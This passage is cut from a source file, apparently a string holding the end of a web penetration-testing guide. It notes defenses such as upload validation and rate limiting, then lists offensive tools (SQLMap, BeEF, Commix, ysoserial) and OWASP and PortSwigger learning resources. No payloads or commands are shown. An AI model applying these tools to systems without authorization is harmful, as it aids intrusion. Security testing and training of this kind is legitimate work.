- **File Type Validation**: Server-side validation blocks malicious uploads
- **Context-Specific Payloads**: XSS payload effectiveness depends on injection context (HTML vs JS vs attribute)
- **Rate Limiting**: Brute-forcing and automated exploitation may be rate-limited

TOOLS REFERENCE:
- **SQLMap**: https://github.com/sqlmapproject/sqlmap
- **Burp Suite**: https://portswigger.net/burp
- **OWASP ZAP**: https://www.zaproxy.org/
- **BeEF**: https://github.com/beefproject/beef (XSS exploitation framework)
- **Commix**: https://github.com/commixproject/commix (Command injection)
- **ysoserial**: https://github.com/frohoff/ysoserial (Java deserialization)

FURTHER READING:
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- OWASP Top 10: https://owasp.org/www-project-top-ten/
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings"
    ),
];